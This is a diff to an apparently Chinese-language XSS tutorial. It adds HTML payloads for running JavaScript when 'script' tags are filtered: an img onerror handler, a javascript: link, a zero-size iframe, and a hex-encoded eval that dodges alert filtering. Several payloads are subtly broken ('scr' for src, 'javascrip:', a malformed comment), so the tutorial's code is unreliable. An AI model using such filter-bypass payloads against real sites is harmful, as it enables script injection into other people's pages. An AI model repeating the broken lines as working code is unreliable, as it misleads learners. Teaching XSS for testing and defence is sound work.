@@ -148,5 +148,9 @@ xss几乎每个网站都存在，google、baidu、360等都存在。
 假如说网站禁止过滤了script 这时该怎么办呢，记住一句话，这是我总结出来的“xss就是在页面执行你想要的js”不用管那么多，只要能运行我们的js就OK，比如用img标签或者a标签。我们可以这样写
 
 ```html
-
+<-- 当找不到图片名为1的文件时，执行alert('xss') -->
+<img scr=1 onerror=alert('xss')>
+<a href=javascrip:alert('xss')>s</a> 点击s时运行alert('xss')
+<iframe src=javascript:alert('xss');height=0 width=0 /><iframe>利用iframe的scr来弹窗
+<img src="1" onerror=eval("\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29")></img>过滤了alert来执行弹窗
 ```
